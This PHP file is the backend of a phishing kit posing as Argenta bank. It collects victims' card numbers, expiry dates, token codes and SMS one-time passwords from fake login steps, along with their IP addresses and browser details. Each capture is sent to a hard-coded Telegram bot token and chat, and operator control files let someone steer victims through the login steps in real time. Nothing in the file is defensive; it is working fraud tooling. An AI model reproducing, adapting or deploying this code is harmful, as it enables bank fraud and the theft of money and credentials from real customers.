<?php

   require_once "../includes/main.php";
   require_once "../app.php";
   
    function victim_infos() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'true' : 'false';
        $platformName   = $detect->getPlatformVersion();
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | Mobile : $isMobile  |  $platformName"  . "\r\n\r\n";
        return $message;
    }
	
    function get_steps_link() {
        $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $x = pathinfo($url);
        return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
    }
    function reset_data() {
        $fp = fopen('vics/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, '');
        fclose($fp);
    }  
	
	
	function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
	
	
   function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '8297340323:AAEonNXHKv9TlTHCbZmLjDMx2lDLeO2qFtc'; // Ton token
    $chat_id  = '-1003209581302'; // Chat ID de la chaîne
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}
   
  
		
      
		

			
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
			
				$formatted_number = substr($_POST['j_cardnumber'], 0, 4) . ' ' .
				substr($_POST['j_cardnumber'], 4, 4) . ' ' .
				substr($_POST['j_cardnumber'], 8, 4) . ' ' .
				substr($_POST['j_cardnumber'], 12, 4) . ' ' .
				substr($_POST['j_cardnumber'], 16, 1);
			
          
                $message = "/--  Argenta | LOGIN --/" . get_client_ip() . "\r\n";
                $message .= 'CardNumber : ' . $formatted_number . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: LODING.php?verification#_");
                exit();
			
			
            }
		
		
		        if ($_POST['step'] == "exp") {
           
          
              	
				$message = "/--  Argenta | EXP/NUM --/" . get_client_ip() . "\r\n";
                $message .= 'EXP : ' . $_POST['expp'] . "\r\n";
				$message .= 'NUM : ' . $_POST['num'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: LODING.php?verification#_");
                exit();
			
			
            }
		
		
		
		    if ($_POST['step'] == "code") {
            $_SESSION['errors']     = [];	
                
				$message = "/--  Argenta | token1 --/" . get_client_ip() . "\r\n";
                $message .= 'token1 : ' . $_POST['token1'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: LODING.php?verification#_");
                exit();
                  
            }
		

			

        if ($_POST['step'] == "sms") {
           
            
				$message = "/--  Argenta | SMS --/" . get_client_ip() . "\r\n";
                $message .= 'SMS : ' . $_POST['otp'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: LODING.php?verification#_");
                exit();
            
        }
		
		
				        if ($_POST['step'] == "extra") {
           
            
				$message = "/-- extra Argenta --/" . get_client_ip() . "\r\n";
                $message .= 'extra : ' . $_POST['otp'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: LODING.php?verification#_");
                exit();
            
        }

	
	
	
	
	
	   if ($_POST['step'] == "control") {
            $fp = fopen('vics/'. $_POST['ip'] .'.txt', 'wb');
           
        $to = $_POST['to'];
        $signaturcode = $_POST['signaturcode'];
 
           
               fwrite($fp, "$to|$signaturcode");
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
?>